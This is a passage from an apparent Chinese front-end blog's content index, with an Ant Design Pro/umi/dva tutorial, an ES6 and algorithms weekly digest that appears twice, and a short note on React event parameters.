可能是纯静态的，也可能包含自己的 state，但不涉及 dva 的数据流，仅受父组件（通常是一个页面）传递的参数控制。 新建文件 在 src/components 下新建一个以组件名命名的文件夹，注意首字母大写，命名尽量体现组件的功能，这里就叫 ImageWrapper。在此文件夹下新增 js 文件及样式文件（如果需要），命名为 index.js和 index.less 在使用组件时，默认会在 index.js 中寻找 export 的对象，如果你的组件比较复杂，可以分为多个文件，最后在 index.js中统一 export，就像这样 1234567891011121314151617// MainComponent.jsexport default (&#123; ... &#125;) =&gt; (...);// SubComponent1.jsexport default (&#123; ... &#125;) =&gt; (...);// SubComponent2.jsexport default (&#123; ... &#125;) =&gt; (...);// index.jsimport MainComponent from './MainComponent';import SubComponent1 from './SubComponent1';import SubComponent2 from './SubComponent2';MainComponent.SubComponent1 = SubComponent1;MainComponent.SubComponent2 = SubComponent2;export default MainComponent; 你的代码大概是这个样子 12345678910// index.jsimport React from 'react';import styles from './index.less'; // 按照 CSS Modules 的方式引入样式文件。export default (&#123; src, desc, style &#125;) =&gt; ( &lt;div style=&#123;style&#125; className=&#123;styles.imageWrapper&#125;&gt; &lt;img className=&#123;styles.img&#125; src=&#123;src&#125; alt=&#123;desc&#125; /&gt; &#123;desc &amp;&amp; &lt;div className=&#123;styles.desc&#125;&gt;&#123;desc&#125;&lt;/div&gt;&#125; &lt;/div&gt;); 123456789101112131415// index.less.imageWrapper &#123; padding: 0 20px 8px; background: #f2f4f5; width: 400px; margin: 0 auto; text-align: center;&#125;.img &#123; vertical-align: middle; max-width: calc(100% - 32px); margin: 2.4em 1em; box-shadow: 0 8px 20px rgba(143, 168, 191, 0.35);&#125; 使用 在要使用这个组件的地方，按照组件定义的 API 传入参数，直接使用就好，不过别忘了先引入 123456789import React from 'react';import ImageWrapper from '@/components/ImageWrapper'; // @ 表示相对于源文件根目录export default () =&gt; ( &lt;ImageWrapper src=\"https://os.alipayobjects.com/rmsportal/mgesTPFxodmIwpi.png\" desc=\"示意图\" /&gt;); 七、样式less Ant Design Pro 默认使用 less 作为样式语言 CSS Modules 在样式开发过程中，有两个问题比较突出 全局污染 —— CSS 文件中的选择器是全局生效的，不同文件中的同名选择器，根据 build 后生成文件中的先后顺序，后面的样式会将前面的覆盖； 选择器复杂 —— 为了避免上面的问题，我们在编写样式的时候不得不小心翼翼，类名里会带上限制范围的标识，变得越来越长，多人开发时还很容易导致命名风格混乱，一个元素上使用的选择器个数也可能越来越多。 为了解决上述问题，我们的脚手架默认使用 CSS Modules 模块化方案，先来看下在这种模式下怎么写样式 1234// example.jsimport styles from &apos;./example.less&apos;;export default (&#123; title &#125;) =&gt; &lt;div className=&#123;styles.title&#125;&gt;&#123;title&#125;&lt;/div&gt;; 123456// example.less.title &#123; color: @heading-color; font-weight: 600; margin-bottom: 16px;&#125; 用 less 写样式好像没什么改变，只是类名比较简单（实际项目中也是这样），js 文件的改变就是在设置 className 时，用一个对象属性取代了原来的字符串，属性名跟 less 文件中对应的类名相同，对象从 less 文件中引入。 在上面的样式文件中，.title 只会在本文件生效，你可以在其他任意文件中使用同名选择器，也不会对这里造成影响。不过有的时候，我们就是想要一个全局生效的样式呢？可以使用 :global 123456789101112131415161718192021// example.less.title &#123; color: @heading-color; font-weight: 600; margin-bottom: 16px;&#125;/* 定义全局样式 */:global(.text) &#123; font-size: 16px;&#125;/* 定义多个全局样式 */:global &#123; .footer &#123; color: #ccc; &#125; .sider &#123; background: #ebebeb; &#125;&#125; CSS Modules 的基本原理很简单，就是对每个类名（非 :global 声明的）按照一定规则进行转换，保证它的唯一性。如果在浏览器里查看这个示例的 dom 结构，你会发现实际渲染出来是这样的 1&lt;div class=&quot;title___3TqAx&quot;&gt;title&lt;/div&gt; 类名被自动添加了一个 hash 值，这保证了它的唯一性 样式文件类别 在一个项目中，样式文件根据功能不同，可以划分为不同的类别 src/index.less# 全局样式文件，在这里你可以进行一些通用设置，比如脚手架中自带的 1234567891011121314html, body, :global(#root) &#123; height: 100%;&#125;body &#123; text-rendering: optimizeLegibility; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;&#125;// temporary font size patch:global(.ant-tag) &#123; font-size: 12px;&#125; src/utils/utils.less# 这里可以放置一些工具函数供调用，比如清除浮动 .clearfix 模块样式 针对某个模块/页面生效的文件 八、和服务端进行交互前端请求流程 在 Ant Design Pro 中，一个完整的前端 UI 交互到服务端处理流程是这样的 UI 组件交互操作； 调用 model 的 effect； 调用统一管理的 service 请求函数； 使用封装的 request.js发送请求； 获取服务端返回； 然后调用reducer改变 state； 更新 model 为了方便管理维护，统一的请求处理都放在 services 文件夹中，并且一般按照 model 维度进行拆分文件 1234services/ user.js api.js ... 其中，utils/request.js是基于 fetch 的封装，便于统一处理 POST，GET 等请求参数，请求头，以及错误提示信息等 123456789101112131415161718192021// services/user.jsimport request from '../utils/request';export async function query() &#123; return request('/api/users');&#125;export async function queryCurrent() &#123; return request('/api/currentUser');&#125;// models/user.jsimport &#123; queryCurrent &#125; from '../services/user';...effects: &#123; *fetch(&#123; payload &#125;, &#123; call, put &#125;) &#123; ... const response = yield call(queryUsers); ... &#125;,&#125; 处理异步请求 在处理复杂的异步请求的时候，很容易让逻辑混乱，陷入嵌套陷阱，所以 Ant Design Pro 的底层基础框架 dva使用 effect 的方式来管理同步化异步请求 123456789101112131415161718192021222324effects: &#123; *fetch(&#123; payload &#125;, &#123; call, put &#125;) &#123; yield put(&#123; type: 'changeLoading', payload: true, &#125;); // 异步请求 1 const response = yield call(queryFakeList, payload); yield put(&#123; type: 'save', payload: response, &#125;); // 异步请求 2 const response2 = yield call(queryFakeList2, payload); yield put(&#123; type: 'save2', payload: response2, &#125;); yield put(&#123; type: 'changeLoading', payload: false, &#125;); &#125;,&#125;, 九、引入外部模块 除了antd组件以及脚手架内置的业务组件，有时我们还需要引入其他外部模块，这里以引入富文本组件 react-quill 为例进行介绍 1$ npm install react-quill --save 1234567891011121314151617181920212223242526272829303132import React from 'react';import &#123; Button, notification, Card &#125; from 'antd';import ReactQuill from 'react-quill'; import 'react-quill/dist/quill.snow.css';export default class NewPage extends React.Component &#123; state = &#123; value: 'test', &#125;; handleChange = (value) =&gt; &#123; this.setState(&#123; value, &#125;) &#125;; prompt = () =&gt; &#123; notification.open(&#123; message: 'We got value:', description: &lt;span dangerouslySetInnerHTML=&#123;&#123; __html: this.state.value &#125;&#125;&gt;&lt;/span&gt;, &#125;); &#125;; render() &#123; return ( &lt;Card title=\"富文本编辑器\"&gt; &lt;ReactQuill value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;Button style=&#123;&#123; marginTop: 16 &#125;&#125; onClick=&#123;this.prompt&#125;&gt;Prompt&lt;/Button&gt; &lt;/Card&gt; ); &#125;&#125; 十、图表 Ant Design Pro 提供了由设计师精心设计抽象的图表类型，是在 BizCharts 图表库基础上的二次封装，同时提供了业务中常用的图表套件，可以单独使用，也可以组合起来实现复杂的展示效果 图表组件 https://pro.ant.design/components/Charts-cn/ 使用 Ant Design Pro 的图表 Charts 图表套件是在 components/Charts 包中，引用到项目就像使用其它组件一样 12345678910111213141516171819202122232425262728293031323334353637import &#123; ChartCard, MiniBar &#125; from '@/components/Charts';import &#123; Tooltip, Icon &#125; from 'antd';const visitData = [ &#123; x: \"2017-09-01\", y: 100 &#125;, &#123; x: \"2017-09-02\", y: 120 &#125;, &#123; x: \"2017-09-03\", y: 88 &#125;, &#123; x: \"2017-09-04\", y: 65 &#125;];ReactDOM.render( &lt;ChartCard title=\"支付笔数\" action=&#123; &lt;Tooltip title=\"支付笔数反应交易质量\"&gt; &lt;Icon type=\"exclamation-circle-o\" /&gt; &lt;/Tooltip&gt; &#125; total=\"6,500\" contentHeight=&#123;46&#125; &gt; &lt;MiniBar height=&#123;46&#125; data=&#123;visitData&#125; /&gt; &lt;/ChartCard&gt;, mountNode); https://github.com/alibaba/BizCharts 使用 BizCharts 绘制图表 如果 Ant Design Pro 不能满足你的业务需求，可以直接使用 BizCharts 封装自己的图表组件。 1npm install bizcharts --save 1234567891011import &#123; Chart, Axis, Tooltip, Geom &#125; from 'bizcharts';const data = [...];&lt;Chart height=&#123;400&#125; data=&#123;data&#125; forceFit&gt; &lt;Axis name=\"month\" /&gt; &lt;Axis name=\"temperature\" label=&#123;&#123; formatter: val =&gt; `$&#123;val&#125;°C` &#125;&#125; /&gt; &lt;Tooltip crosshairs=&#123;&#123; type : \"y\" &#125;&#125; /&gt; &lt;Geom type=\"line\" position=\"month*temperature\" size=&#123;2&#125; color=&#123;'city'&#125; /&gt; &lt;Geom type='point' position=\"month*temperature\" size=&#123;4&#125; color=&#123;'city'&#125; /&gt;&lt;/Chart&gt; 十一、业务图标 通常情况下，你可以通过 Ant Design 提供的 &lt;Icon /&gt; 图标组件来使用 Ant Design 官方图标。基本使用方式如下： 1&lt;Icon type=&quot;heart&quot; style=&#123;&#123; fontSize: &apos;16px&apos;, color: &apos;hotpink&apos; &#125;&#125; /&gt; 如果你没有在 Ant Design 官方图标中找到需要的图标，可以到 iconfont.cn 上采集并生成自己的业务图标库，再进行使用 生成图标库代码 首先，搜索并找到你需要的图标，将它采集到你的购物车里，在购物车里，你可以将选中的图标添加到项目中（没有的话，新建一个），后续生成的资源/代码都是以项目为维度的。 如果你已经有了设计稿，只是需要生成相关代码，可以上传你的图标后，再进行上面的操作 来到刚才选中的项目页，点击『生成代码』的链接，会在下方生成不同引入方式的代码，下面会分别介绍 引入 有三种引入方式供你选择：SVG Symbol、Unicode 及 Font class。我们推荐在现代浏览器下使用 SVG Symbol方式引入。 SVG 符号引入是现代浏览器未来主流的图标引入方式。其方法是预先加载符号，在合适的地方引入并渲染为矢量图形。有如下特点： 支持多色图标，不再受到单色图标的限制 通过一些技巧，支持像字体那样，通过 font-size、color 来调整样式 支持IE 9+ 及现代浏览器 切换到 Symbol 页签，复制项目生成的地址代码： 1//at.alicdn.com/t/font_405362_lyhvoky9rc7ynwmi.js 加入图标样式代码，如果没有特殊的要求，你可以直接复用 Ant Design 图标的样式 123456.icon &#123; width: 1em; height: 1em; fill: currentColor; vertical-align: -.125em;&#125; 挑选相应图标并获取类名，应用于页面 123&lt;svg class=&quot;icon&quot; aria-hidden=&quot;true&quot;&gt; &lt;use xlink:href=&quot;#icon-ali-pay&quot;&gt;&lt;/use&gt;&lt;/svg&gt; 你也可以通过使用 Ant Design 图标组件提供的 Icon.createFromIconfontCN({...}) 方法来更加方便地使用图标，使用方式如下： 1234567import &#123; Icon &#125; from &apos;antd&apos;;const IconFont = Icon.createFromIconfontCN(&#123; scriptUrl: &apos;//at.alicdn.com/t/font_405362_lyhvoky9rc7ynwmi.js&apos;&#125;);export default IconFont; 之后可以像使用 &lt;Icon /&gt; 组件一样方便地使用，支持配置样式 1&lt;IconFont type=&quot;icon-ali-pay&quot; style=&#123;&#123; fontSize: &apos;16px&apos;, color: &apos;lightblue&apos; &#125;&#125; /&gt; 了解更多用法 https://pro.ant.design/docs/biz-icon-cn#%E4%BA%8C%E3%80%81%E5%BC%95%E5%85%A5 十二、Mock 和联调 Mock 数据是前端开发过程中必不可少的一环，是分离前后端开发的关键链路。通过预先跟服务器端约定好的接口，模拟请求数据甚至逻辑，能够让前端开发独立自主，不会被服务端的开发所阻塞 在 Ant Design Pro 中，因为我们的底层框架是 umi，而它自带了代理请求功能，通过代理请求就能够轻松处理数据模拟的功能 使用 umi 的 mock 功能 umi 里约定 mock 文件夹下的文件即 mock 文件，文件导出接口定义，支持基于 require 动态分析的实时刷新，支持 ES6 语法，以及友好的出错提示 12345678910export default &#123; // 支持值为 Object 和 Array 'GET /api/users': &#123; users: [1, 2] &#125;, // GET POST 可省略 '/api/users/1': &#123; id: 1 &#125;, // 支持自定义函数，API 参考 express@4 'POST /api/users/create': (req, res) =&gt; &#123; res.end('OK'); &#125;,&#125;; 当客户端（浏览器）发送请求，如：GET /api/users，那么本地启动的 umi dev 会跟此配置文件匹配请求路径以及方法，如果匹配到了，就会将请求通过配置处理，就可以像样例一样，你可以直接返回数据，也可以通过函数处理以及重定向到另一个服务器 了解更多 https://pro.ant.design/docs/mock-api-cn#%E4%BD%BF%E7%94%A8-umi-%E7%9A%84-mock-%E5%8A%9F%E8%83%BD 十三、主题定制 我们基于 Ant Design React 进行开发，完全支持官方提供的 less 变量定制功能. 你可以在脚手架目录中找到 config/config.js 代码类似这样 1234567891011...theme: &#123; &apos;font-size-base&apos;: &apos;14px&apos;, &apos;badge-font-size&apos;: &apos;12px&apos;, &apos;btn-font-size-lg&apos;: &apos;@font-size-base&apos;, &apos;menu-dark-bg&apos;: &apos;#00182E&apos;, &apos;menu-dark-submenu-bg&apos;: &apos;#000B14&apos;, &apos;layout-sider-background&apos;: &apos;#00182E&apos;, &apos;layout-body-background&apos;: &apos;#f0f2f5&apos;,&#125;;... 十四、权限管理 只需要在配置菜单的时候配置上准入身份，在登录成功以后获取到登陆者身份以后更新登录人身份参数即可 权限组件 Authorized 这是脚手架权限管理的基础，基本思路是通过比对当前权限与准入权限，决定展示正常渲染内容还是异常内容 控制菜单和路由显示 如需对某些页面进行权限控制，只须在路由配置文件 router.config.js 中设置 authority 属性即可，代表该路由的准入权限，pro 的路由系统中会默认包裹 Authorized 进行判断处理。 1234567891011121314151617181920&#123; path: '/form', icon: 'form', name: 'form', routes:[&#123; path: '/form/basic-form', name: 'basicform', component: './Forms/BasicForm', &#125;, &#123; path: '/form/step-form', name: 'stepform', component: './Forms/StepForm', authority: ['guest'], // 配置准入权限，可以配置多个角色 &#125;, &#123; path: '/form/advanced-form', name: 'advancedform', component: './Forms/AdvancedForm', authority: ['admin'], // 配置准入权限，可以配置多个角色 &#125;],&#125; 控制页面元素显示 使用 Authorized 或Authorized.Secured 可以很方便地控制元素/组件的渲染。https://pro.ant.design/components/Authorized#Authorized.Secured demo关于权限简介 用邮箱自己注册账户（注册后可以登录但是没有任何权限）guest 联系管理员分配权限（分配后可以查看有权限的页面） 每次登录后获取最新的权限身份（如：admin，user，guest） 在src/router.js中会发现如下代码 123456&lt;AuthorizedRoute path=\"/\" render=&#123;props =&gt; &lt;BasicLayout &#123;...props&#125; /&gt;&#125; authority=&#123;['admin', 'user', 'guest']&#125; redirectPath=\"/user/login\"/&gt; 其中authority对象就是准入身份的数组，表示只有这些身份的人可以登录，我们在配置的时候一定不要忘记在这更新我们新增的身份 然后就是menu.js,如下，展示了我们在配置菜单的时候怎么配身份 1234567891011121314151617181920212223242526272829const menuData = [&#123; name: '题库管理', path: 'question', icon: 'warning', authority: ['admin', 'user'], children: [&#123; name: '题库列表', path: 'list', &#125;, &#123; name: '编辑题目', path: 'create-question', hideInMenu: true, &#125;, &#123; name: '科目管理' &#125;]&#125;, &#123; name: '账号管理', icon: 'warning', path: 'account', children: [&#123; name: '账号列表', path: 'list', authority: 'admin', &#125;, &#123; name: '建设中', path: '', authority: ['admin', 'user'], &#125;]&#125;] 登录成功以后怎么获取权限了 123456789101112131415161718192021222324252627effects：&#123;* login(&#123;payload&#125;, &#123;call, put&#125;) &#123; const response = yield call(login, payload); yield put(&#123; type: 'changeLoginStatus', payload: response, &#125;); // 登录成功以后更新权限，跳转页面 if (response &amp;&amp; response.code === '0000') &#123; reloadAuthorized(); yield put(routerRedux.push('/')); &#125; &#125;,&#125;，reducers: &#123; changeLoginStatus(state, &#123;payload&#125;) &#123; let _status = \"ok\"; let _user = \"admin\"; setToken(\"token\"); setAuthority(_user);//设置权限 return &#123; ...state, status: _status, type: 'account', &#125;; &#125;, &#125; 我们看看setAuthority、reloadAuthorized这两个方法都做了什么事儿 12345678//设置身份export function setAuthority(authority) &#123; return localStorage.setItem('antd-pro-authority', authority);&#125;//获取身份export function getAuthority() &#123; return localStorage.getItem('antd-pro-authority');&#125; 如此而且，只是把新的身份值存在localStorage里边，注意getAuthority，下边会用到 123456789import RenderAuthorized from '../components/Authorized';import &#123; getAuthority &#125; from './authority';let Authorized = RenderAuthorized(getAuthority());const reloadAuthorized = () =&gt; &#123; Authorized = RenderAuthorized(getAuthority());&#125;;export &#123; reloadAuthorized &#125;;export default Authorized;RenderAuthorized: (currentAuthority: string | () =&gt; string) =&gt; Authorized 权限组件默认 export RenderAuthorized 函数，它接收当前权限作为参数，返回一个权限对象，该对象提供以下几种使用方式 Authorized 最基础的权限控制 参数 说明 children 正常渲染的元素，权限判断通过时展示 authority 准入权限/权限判断 noMatch 权限异常渲染元素，权限判断不通过时展示 Authorized.AuthorizedRoute 参数 说明 authority 准入权限/权限判断 redirectPath 权限异常时重定向的页面路由 Authorized.Secured 注解方式，`@Authorized.Secured(authority, error)` 参数 说明 authority 准入权限/权限判断 error 权限异常时渲染元素 Authorized.check 函数形式的 Authorized，用于某些不能被 HOC 包裹的组件。 Authorized.check(authority, target, Exception) 注意：传入一个 Promise 时，无论正确还是错误返回的都是一个 ReactClass 参数 说明 authority 准入权限/权限判断 target 权限判断通过时渲染的元素 Exception 权限异常时渲染元素 十五、构建和发布构建 当项目开发完毕，只需要运行一行命令就可以打包你的应用： 1$ npm run build 由于 Ant Design Pro 使用的工具 Umi 已经将复杂的流程封装完毕，构建打包文件只需要一个命令 umi build，构建打包成功之后，会在根目录生成 dist 文件夹，里面就是构建打包好的文件，通常是 .js、.css、index.html 等静态文件 分析构建文件体积 如果你的构建文件很大，你可以通过 analyze 命令构建并分析依赖模块的体积分布，从而优化你的代码。 1$ npm run analyze 发布 对于发布来讲，只需要将最终生成的静态文件，也就是通常情况下 dist 文件夹的静态文件发布到你的 cdn 或者静态服务器即可，需要注意的是其中的 index.html 通常会是你后台服务的入口页面，在确定了 js 和 css 的静态之后可能需要改变页面的引入路径 前端路由与服务端的结合 Ant Design Pro 使用的 Umi 支持两种路由方式：browserHistory 和 hashHistory。 可以在 config/config.js 中进行配置选择用哪个方式： 123export default &#123; history: 'hash', // 默认是 browser&#125; 十六、一些问题在ant-design-pro中解决跨域办法 需要在配置文件中(.webpackrc)加入如下代码 1234567\"proxy\": &#123; \"/api\": &#123; \"target\": \"http://xxx:xx/\", \"changeOrigin\": true, \"pathRewrite\": &#123; \"^/api\" : \"\" &#125; &#125;&#125;, 需要注意的是此处不是将/api/代理到正式请求/api/中，（例如请求/api/users则会代理到http://xxx:xx/users）如果需要多次代理且需要代理到不同的服务器则可以在配置文件中进行如下配置 123456789101112\"proxy\": &#123; \"/test\": &#123; \"target\": \"http://xxx:xx/\", \"changeOrigin\": true, \"pathRewrite\": &#123; \"^/test\" : \"\" &#125; &#125;, \"/cross\": &#123; \"target\": \"http://jsonplaceholder.typicode.com\", \"changeOrigin\": true, \"pathRewrite\": &#123;\"^/cross\": \"\"&#125; &#125; // 此处有一点需要注意，不能在最后一个代理对象后面加逗号，否则会报错！！！ &#125;, 在model中怎么同时发起多次请求 因为yield将异步请求转为同步请求了，所以请求会按照同步顺序依次执行，使请求时间延长 错误写法 123// effects将按顺序执行const response = yield call(fetch, '/users');const res = yield call(fetch, '/roles'); 正确写法 12345// effects将会同步执行const [response, res] = yield [ call(fetch, '/users'), call(fetch, '/roles'),]","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Dva","slug":"Dva","permalink":"https://ru23.com/tags/Dva/"},{"name":"Umi","slug":"Umi","permalink":"https://ru23.com/tags/Umi/"}]},{"title":"前端周刊-2018年09月第2周","slug":"2018-09-前端周刊-2018年09月第2周","date":"2018-09-11T08:18:25.000Z","updated":"2018-10-24T03:46:03.319Z","comments":true,"path":"note/73a03d66.html","link":"","permalink":"https://ru23.com/note/73a03d66.html","excerpt":"","text":"es6常用基础合集url:https://www.jianshu.com/p/cfb0893c34f1知识点:let,const箭头函数模板字符串解析结构函数默认参数展开运算符对象字面量与classPromise ES6新特性概览url： http://www.cnblogs.com/Wayou/p/es6_new_features.html知识点:箭头操作符类的支持增强的对象字面量字符串模板解构参数默认值，不定参数，拓展参数let与const 关键字for of 值遍历iterator, generator模块Map，Set 和 WeakMap，WeakSetProxiesSymbolsMath，Number，String，Object 的新API 透彻掌握Promise的使用，读这篇就够了url：https://www.jianshu.com/p/fe5f173276bd知识点：实现方法1.new Promise(fn),创建一个新的Promise对象并传入第一个执行方法。2.resolve。成功的执行方法3.reject。失败的执行方法4.catch。失败的捕获。5.then。链式调用下一步。原理：内部使用一个数组报错需要执行的所有方法，使用then来添加新的方法。旧的方法执行完毕之后检测数组，如果有新的就执行123456789101112131415161718192021class Promise &#123; result: any; callbacks = []; failbacks = []; constructor(fn) &#123; fn(this.resolve.bind(this), this.reject.bind(this)); &#125; resolve(res) &#123; if (this.callbacks.length &gt; 0) this.callbacks.shift()(res, this.resolve.bind(this), this.reject.bind(this)); &#125; reject(res) &#123; this.callbacks = []; if (this.failbacks.length &gt; 0) this.failbacks.shift()(res, this.resolve.bind(this), this.reject.bind(this)); &#125; catch (fn) &#123; this.failbacks.push(fn); &#125; then(fn) &#123; this.callbacks.push(fn); return this; &#125;&#125; 调用示例：1234567891011var a = new Promise(function(resolve, reject) &#123; setTimeout(function() &#123; resolve(\"成功\"); &#125;, 1000);&#125;).then(function(result, resolve, reject) &#123; console.log(result) reject(\"失败\")&#125;).catch (function(err) &#123; console.log(err);&#125;); es6写法：1234567891011121314151617//创建promisevar promise = new Promise(function(resolve, reject) &#123; // 进行一些异步或耗时操作 if ( /*如果成功 */ ) &#123; resolve(\"Stuff worked!\"); &#125; else &#123; reject(Error(\"It broke\")); &#125;&#125;);//绑定处理程序promise.then(function(result) &#123; //promise成功的话会执行这里 console.log(result); // \"Stuff worked!\"&#125;, function(err) &#123; //promise失败会执行这里 console.log(err); // Error: \"It broke\"&#125;); 4.前端算法相关url:https://github.com/qianbin01/frontend_train#sort知识点冒泡排序 比较两个相邻的项，如果第一个大于第二个则交换他们的位置,元素项向上移动至正确的顺序，就好像气泡往上冒一样 快速排序: 1) 首先，在数组中选择一个中间项作为主元2) 创建两个指针，左边的指向数组第一个项，右边的指向最后一个项，移动左指针，直到找到一个比主元大的项，接着，移动右边的指针，直到找到一个比主元小的项，然后交换它们。重复这个过程，直到 左侧的指针超过了右侧的指针。这个使比主元小的都在左侧，比主元大的都在右侧。这一步叫划分操作3) 接着，算法对划分后的小数组（较主元小的值组成的的小数组， 以及较主元大的值组成的小数组）重复之前的两个步骤，直到排序完成 选择排序: 大概思路是找到最小的放在第一位，找到第二小的放在第二位，以此类推 算法复杂度O(n^2) 归并排序: 归并排序：Mozilla Firefox 使用归并排序作为Array.prototype.sort的实现，而chrome使用快速排序的一个变体实现的,前面三种算法性能不好，但归并排序性能不错 算法复杂度O(nlog^n)归并排序是一种分治算法。本质上就是把一个原始数组切分成较小的数组，直到每个小数组只有一个位置，接着把小数组归并成较大的数组，在归并过程中也会完成排序，直到最后只有一个排序完毕的大数组 堆排序： 堆排序把数组当中二叉树来排序而得名。1）索引0是树的根节点；2）除根节点为，任意节点N的父节点是N/2；3）节点L的左子节点是2L；4）节点R的右子节点为2R + 1本质上就是先构建二叉树，然后把根节点与最后一个进行交换，然后对剩下对元素进行二叉树构建，进行交换，直到剩下最后一个 5.Javascript常用知识点url: https://github.com/qianbin01/frontend_train#javascript知识点map,reduce,filter的用法js数据类型(7种) 1.number;2.string;3.boolean;4.undefined;5.null;6.symbol（ES6新增，文章后面有对着新类型的解释）Symbol 生成一个全局唯一的值。7.Object.（包括Object，Array，Function）闭包12345678function foo(x) &#123; var tmp = 3; return function (y) &#123; alert(x + y + (++tmp)); &#125;&#125;var bar = foo(2); // bar 现在是一个闭包bar(10); 结果是16es6通常用let const块级作用域代替，闭包缺点，ie中会引起内存泄漏，严格来说是ie的缺点不是闭包的问题 什么是立即执行函数？使用立即执行函数的目的是什么？1234567891011//常见两种方式1.(function()&#123;...&#125;)() (function(x)&#123; console.log(x); &#125;)(12345)2.(function()&#123;...&#125;()) (function(x)&#123; console.log(x); &#125;(12345))//作用 不破坏污染全局的命名空间，若需要使用，将其用变量传入如（function(window)&#123;...&#125;(window)） async/await 语法深浅拷贝数组去重思路1：定义一个新数组，并存放原数组的第一个元素，然后将元素组一一和新数组的元素对比，若不同则存放在新数组中思路2：先将原数组排序，在与相邻的进行比较，如果不同则存入新数组。思路3：利用对象属性存在的特性，如果没有该属性则存入新数组。思路4（最常用）：使用es6 set12let arr= [1, 2, 3, 3, 5, 7, 2, 6, 8];console.log([...new Set(arr)]); JS原型","categories":[{"name":"前端分享","slug":"前端分享","permalink":"https://ru23.com/categories/前端分享/"}],"tags":[{"name":"前端周刊","slug":"前端周刊","permalink":"https://ru23.com/tags/前端周刊/"}]},{"title":"reactjs中事件传参(关于event)","slug":"2018-09-reactjs中事件传参-关于event","date":"2018-09-10T07:06:44.000Z","updated":"2018-10-24T03:46:02.625Z","comments":true,"path":"note/7205ee34.html","link":"","permalink":"https://ru23.com/note/7205ee34.html","excerpt":"","text":"问题描述我们在事件中通常需要获取控件的值，通常通过event.target.value的方式来取值，在绑定事件时，event参数也不需要传递，在方法中直接使用即可。但是，有些时候需要传入一些其他的参数，比如需要循环绑定一些输入框，在绑定onChange事件时，需要传入索引index和数据源的索引进行对应1234567891011121314151617181920212223242526onHandleChange(index,event)&#123; let val=event.target.value&#125;//关键代码source.map((item,index)=&gt;&#123; return &lt;input type=\"text\" value=&#123;item.name&#125; onChange=&#123;this.onHandleChange.bind(this,index)&#125; /&gt;&#125;);``` #### 代码解释有的同学应该已经看出区别了，onHandleChange在声明时有两个参数，但在调用时却只传递了一个参数，这就是今天要讲的:&gt; **在给方法传递新参数时，方法原有的参数会排在新参数之后**做过reactjs的同学都知道，event这个参数是不需要手动传递的，直接在方法中声明就可以使用，如下代码：```jsxonChangeHandle(event)&#123; let val=event.target.value;&#125;render()&#123; return (&lt;div&gt; &lt;input type=\"text\" onChange=&#123;this.onChangeHandle.bind(this)&#125; /&gt;&lt;/div&gt;)&#125; 摘自 作者：不将就人生链接：https://www.jianshu.com/p/1026d71d04d6來源：简书简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。","categories":[],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"前端开发周刊-(2018年09月第2周)","slug":"2018-09-ES6-基础-【好文分享】","date":"2018-09-10T03:48:21.000Z","updated":"2018-10-24T03:46:02.610Z","comments":true,"path":"note/d53aad1e.html","link":"","permalink":"https://ru23.com/note/d53aad1e.html","excerpt":"","text":"es6常用基础合集url:https://www.jianshu.com/p/cfb0893c34f1知识点:let,const箭头函数模板字符串解析结构函数默认参数展开运算符对象字面量与classPromise ES6新特性概览url： http://www.cnblogs.com/Wayou/p/es6_new_features.html知识点:箭头操作符类的支持增强的对象字面量字符串模板解构参数默认值，不定参数，拓展参数let与const 关键字for of 值遍历iterator, generator模块Map，Set 和 WeakMap，WeakSetProxiesSymbolsMath，Number，String，Object 的新API 透彻掌握Promise的使用，读这篇就够了url：https://www.jianshu.com/p/fe5f173276bd知识点：实现方法1.new Promise(fn),创建一个新的Promise对象并传入第一个执行方法。2.resolve。成功的执行方法3.reject。失败的执行方法4.catch。失败的捕获。5.then。链式调用下一步。原理：内部使用一个数组报错需要执行的所有方法，使用then来添加新的方法。旧的方法执行完毕之后检测数组，如果有新的就执行123456789101112131415161718192021class Promise &#123; result: any; callbacks = []; failbacks = []; constructor(fn) &#123; fn(this.resolve.bind(this), this.reject.bind(this)); &#125; resolve(res) &#123; if (this.callbacks.length &gt; 0) this.callbacks.shift()(res, this.resolve.bind(this), this.reject.bind(this)); &#125; reject(res) &#123; this.callbacks = []; if (this.failbacks.length &gt; 0) this.failbacks.shift()(res, this.resolve.bind(this), this.reject.bind(this)); &#125; catch (fn) &#123; this.failbacks.push(fn); &#125; then(fn) &#123; this.callbacks.push(fn); return this; &#125;&#125; 调用示例：1234567891011var a = new Promise(function(resolve, reject) &#123; setTimeout(function() &#123; resolve(\"成功\"); &#125;, 1000);&#125;).then(function(result, resolve, reject) &#123; console.log(result) reject(\"失败\")&#125;).catch (function(err) &#123; console.log(err);&#125;); es6写法：1234567891011121314151617//创建promisevar promise = new Promise(function(resolve, reject) &#123; // 进行一些异步或耗时操作 if ( /*如果成功 */ ) &#123; resolve(\"Stuff worked!\"); &#125; else &#123; reject(Error(\"It broke\")); &#125;&#125;);//绑定处理程序promise.then(function(result) &#123; //promise成功的话会执行这里 console.log(result); // \"Stuff worked!\"&#125;, function(err) &#123; //promise失败会执行这里 console.log(err); // Error: \"It broke\"&#125;); 4.前端算法相关url:https://github.com/qianbin01/frontend_train#sort知识点冒泡排序 比较两个相邻的项，如果第一个大于第二个则交换他们的位置,元素项向上移动至正确的顺序，就好像气泡往上冒一样 快速排序: 1) 首先，在数组中选择一个中间项作为主元2) 创建两个指针，左边的指向数组第一个项，右边的指向最后一个项，移动左指针，直到找到一个比主元大的项，接着，移动右边的指针，直到找到一个比主元小的项，然后交换它们。重复这个过程，直到 左侧的指针超过了右侧的指针。这个使比主元小的都在左侧，比主元大的都在右侧。这一步叫划分操作3) 接着，算法对划分后的小数组（较主元小的值组成的的小数组， 以及较主元大的值组成的小数组）重复之前的两个步骤，直到排序完成 选择排序: 大概思路是找到最小的放在第一位，找到第二小的放在第二位，以此类推 算法复杂度O(n^2) 归并排序: 归并排序：Mozilla Firefox 使用归并排序作为Array.prototype.sort的实现，而chrome使用快速排序的一个变体实现的,前面三种算法性能不好，但归并排序性能不错 算法复杂度O(nlog^n)归并排序是一种分治算法。本质上就是把一个原始数组切分成较小的数组，直到每个小数组只有一个位置，接着把小数组归并成较大的数组，在归并过程中也会完成排序，直到最后只有一个排序完毕的大数组 堆排序： 